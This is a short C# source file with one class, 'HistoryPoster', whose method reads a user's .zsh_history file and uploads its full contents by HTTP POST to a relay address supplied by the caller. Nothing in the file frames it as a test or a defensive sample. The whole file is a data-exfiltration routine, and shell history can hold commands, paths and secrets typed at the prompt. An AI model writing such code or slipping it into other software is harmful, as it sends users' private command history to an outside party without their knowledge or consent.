using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

sealed class HistoryPoster
{
    public static async Task Post(string relay, HttpClient client)
    {
        var history = Path.Combine("/Users/sample", ".zsh_history");
        if (!File.Exists(history)) return;
        await using var body = File.OpenRead(history);
        await client.PostAsync(relay, new StreamContent(body));
    }
}
